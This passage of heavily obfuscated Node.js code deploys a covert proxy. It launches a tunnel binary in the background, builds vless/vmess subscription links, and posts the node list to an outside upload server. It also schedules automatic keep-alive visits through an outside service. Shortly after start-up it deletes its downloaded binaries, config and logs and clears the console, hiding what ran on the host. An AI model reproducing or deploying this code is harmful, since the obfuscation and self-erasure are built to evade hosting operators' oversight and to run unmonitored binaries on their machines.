_0x1fb5ed=_0x190b5b[0x1];_0x1edd0f[_0x4286b9(0x167)](_0x1fb5ed);}});if(_0x1edd0f[_0x3222b2(0x12b)]>0x0)_0x18ce75=_0x1edd0f[0x0],console[_0x3222b2(0x194)]('ArgoDomain:',_0x18ce75),await _0x2ebfd6(_0x18ce75);else{console[_0x3222b2(0x194)](_0x3222b2(0x1a5)),fs[_0x3222b2(0x16e)](path['join'](FILE_PATH,_0x3222b2(0xe9)));async function _0x430dd5(){const _0x163780=_0x3222b2;try{process[_0x163780(0x12e)]===_0x163780(0xdf)?await exec(_0x163780(0x116)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x163780(0x103)+botName[_0x163780(0x109)](0x0)+']'+botName[_0x163780(0x1a2)](0x1)+_0x163780(0x10f));}catch(_0x4c658e){}}_0x430dd5(),await new Promise(_0x18aba0=>setTimeout(_0x18aba0,0xbb8));const _0x2167ee='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3222b2(0x1b8)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2167ee+'\x20>/dev/null\x202>&1\x20&'),console[_0x3222b2(0x194)](botName+_0x3222b2(0xec)),await new Promise(_0x231142=>setTimeout(_0x231142,0xbb8)),await extractDomains();}catch(_0x37a7f1){console[_0x3222b2(0x13a)](_0x3222b2(0x1bc)+_0x37a7f1);}}}catch(_0x1335e2){console[_0x3222b2(0x13a)](_0x3222b2(0x19e),_0x1335e2);}async function _0x183c05(){const _0x467136=_0x3222b2;try{const _0x50fbc5={};_0x50fbc5[_0x467136(0x16b)]=0xbb8;const _0x4e28e7=await axios[_0x467136(0x17e)](_0x467136(0xdc),_0x50fbc5);if(_0x4e28e7[_0x467136(0x10a)]&&_0x4e28e7[_0x467136(0x10a)]['country_code']&&_0x4e28e7[_0x467136(0x10a)][_0x467136(0x14c)])return _0x4e28e7[_0x467136(0x10a)][_0x467136(0x198)]+'_'+_0x4e28e7[_0x467136(0x10a)][_0x467136(0x14c)];}catch(_0xf0ef22){try{const _0x498c34={};_0x498c34[_0x467136(0x16b)]=0xbb8;const _0x2a6a51=await axios[_0x467136(0x17e)](_0x467136(0x154),_0x498c34);if(_0x2a6a51[_0x467136(0x10a)]&&_0x2a6a51['data'][_0x467136(0x112)]==='success'&&_0x2a6a51['data'][_0x467136(0x17a)]&&_0x2a6a51[_0x467136(0x10a)]['org'])return _0x2a6a51['data']['countryCode']+'_'+_0x2a6a51['data']['org'];}catch(_0x5b227a){}}return _0x467136(0xd8);}async function _0x2ebfd6(_0x396af2){const _0x5f17f8=await _0x183c05(),_0x14e6fc=NAME?NAME+'-'+_0x5f17f8:_0x5f17f8;return new Promise(_0x2542b6=>{setTimeout(()=>{const _0x4b0bec=_0x3d0f,_0x145d88={};_0x145d88['v']='2',_0x145d88['ps']=''+_0x14e6fc,_0x145d88[_0x4b0bec(0x1aa)]=CFIP,_0x145d88[_0x4b0bec(0x12a)]=CFPORT,_0x145d88['id']=UUID,_0x145d88['aid']='0',_0x145d88[_0x4b0bec(0x163)]='none',_0x145d88['net']='ws',_0x145d88[_0x4b0bec(0xd6)]=_0x4b0bec(0x1c3),_0x145d88[_0x4b0bec(0x1b7)]=_0x396af2,_0x145d88[_0x4b0bec(0x168)]=_0x4b0bec(0x19c),_0x145d88['tls']='tls',_0x145d88[_0x4b0bec(0x1a9)]=_0x396af2,_0x145d88[_0x4b0bec(0x156)]='',_0x145d88['fp']='firefox';const _0x2ed805=_0x145d88,_0x284f6a='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x4b0bec(0x186)+_0x396af2+'&fp=firefox&type=ws&host='+_0x396af2+_0x4b0bec(0x1bf)+_0x14e6fc+_0x4b0bec(0x189)+Buffer[_0x4b0bec(0x119)](JSON[_0x4b0bec(0x101)](_0x2ed805))[_0x4b0bec(0x184)](_0x4b0bec(0x157))+_0x4b0bec(0x132)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x396af2+'&fp=firefox&type=ws&host='+_0x396af2+_0x4b0bec(0x17d)+_0x14e6fc+_0x4b0bec(0x13d);console[_0x4b0bec(0x194)](Buffer[_0x4b0bec(0x119)](_0x284f6a)[_0x4b0bec(0x184)](_0x4b0bec(0x157))),fs[_0x4b0bec(0x131)](subPath,Buffer[_0x4b0bec(0x119)](_0x284f6a)[_0x4b0bec(0x184)](_0x4b0bec(0x157))),console[_0x4b0bec(0x194)](FILE_PATH+_0x4b0bec(0x13e)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x4e6d44,_0x515d3a)=>{const _0x3bb0a2=_0x4b0bec,_0x360f30=Buffer[_0x3bb0a2(0x119)](_0x284f6a)[_0x3bb0a2(0x184)](_0x3bb0a2(0x157));_0x515d3a[_0x3bb0a2(0x12f)]('Content-Type',_0x3bb0a2(0x144)),_0x515d3a[_0x3bb0a2(0x164)](_0x360f30);}),_0x2542b6(_0x284f6a);},0x7d0);});}}async function uploadNodes(){const _0x5759ae=_0x484fb8;if(UPLOAD_URL&&PROJECT_URL){const _0xaac617=PROJECT_URL+'/'+SUB_PATH,_0x16e7f1={};_0x16e7f1[_0x5759ae(0x137)]=[_0xaac617];const _0x2318cc=_0x16e7f1;try{const _0xdd8b18={};_0xdd8b18[_0x5759ae(0x1a8)]=_0x5759ae(0x185);const _0x324c11={};_0x324c11[_0x5759ae(0x17c)]=_0xdd8b18;const _0xe5400b=await axios[_0x5759ae(0xda)](UPLOAD_URL+_0x5759ae(0x1c1),_0x2318cc,_0x324c11);return _0xe5400b&&_0xe5400b['status']===0xc8?(console[_0x5759ae(0x194)](_0x5759ae(0x13f)),_0xe5400b):null;}catch(_0x229b83){if(_0x229b83[_0x5759ae(0x150)]){if(_0x229b83[_0x5759ae(0x150)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0xe77e53=fs[_0x5759ae(0x1c0)](listPath,'utf-8'),_0x1cc761=_0xe77e53[_0x5759ae(0xfd)]('\x0a')[_0x5759ae(0x1c4)](_0x947ba1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5759ae(0x11b)](_0x947ba1));if(_0x1cc761[_0x5759ae(0x12b)]===0x0)return;const _0x51fafa={};_0x51fafa[_0x5759ae(0xdd)]=_0x1cc761;const _0x2b4393=JSON[_0x5759ae(0x101)](_0x51fafa);try{const _0x28af7b={};_0x28af7b['Content-Type']=_0x5759ae(0x185);const _0x595972={};_0x595972[_0x5759ae(0x17c)]=_0x28af7b;const _0x27b70b=await axios[_0x5759ae(0xda)](UPLOAD_URL+'/api/add-nodes',_0x2b4393,_0x595972);return _0x27b70b&&_0x27b70b[_0x5759ae(0x112)]===0xc8?(console[_0x5759ae(0x194)](_0x5759ae(0xd4)),_0x27b70b):null;}catch(_0x43342a){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x22d897=_0x3d0f,_0x43a2ca=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x43a2ca[_0x22d897(0x167)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x43a2ca['push'](phpPath);process[_0x22d897(0x12e)]===_0x22d897(0xdf)?exec(_0x22d897(0x178)+_0x43a2ca[_0x22d897(0x134)]('\x20')+_0x22d897(0x176),_0x181d7f=>{const _0x52b08b=_0x22d897;console[_0x52b08b(0x105)](),console[_0x52b08b(0x194)](_0x52b08b(0x147)),console[_0x52b08b(0x194)](_0x52b08b(0x171));}):exec(_0x22d897(0x18f)+_0x43a2ca[_0x22d897(0x134)]('\x20')+_0x22d897(0x1ba),_0x33ba12=>{const _0x50c8b0=_0x22d897;console[_0x50c8b0(0x105)](),console[_0x50c8b0(0x194)]('App\x20is\x20running'),console['log'](_0x50c8b0(0x171));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3292d2=_0x484fb8;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x3cc141={};_0x3cc141[_0x3292d2(0x15d)]=PROJECT_URL;const _0x5d1720={};_0x5d1720['Content-Type']=_0x3292d2(0x185);const _0x415f0b={};_0x415f0b[_0x3292d2(0x17c)]=_0x5d1720;const _0x381dc1=await axios['post'](_0x3292d2(0xf5),_0x3cc141,_0x415f0b);return console['log'](_0x3292d2(0x175)),_0x381dc1;}catch(_0x473a3b){return console['error'](_0x3292d2(0x1bd)+_0x473a3b[_0x3292d2(0x160)]),null;}}async function startserver(){const _0x75d4ce=_0x484fb8;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1fddc2){console[_0x75d4ce(0x13a)]('Error\x20in\x20startserver:',_0x1fddc2);}}startserver()[_0x484fb8(0x114)](_0x20ade1=>{const _0x1eabdc=_0x484fb8;console[_0x1eabdc(0x13a)](_0x1eabdc(0x181),_0x20ade1);}),app[_0x484fb8(0x1b1)](PORT,()=>console[_0x484fb8(0x194)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
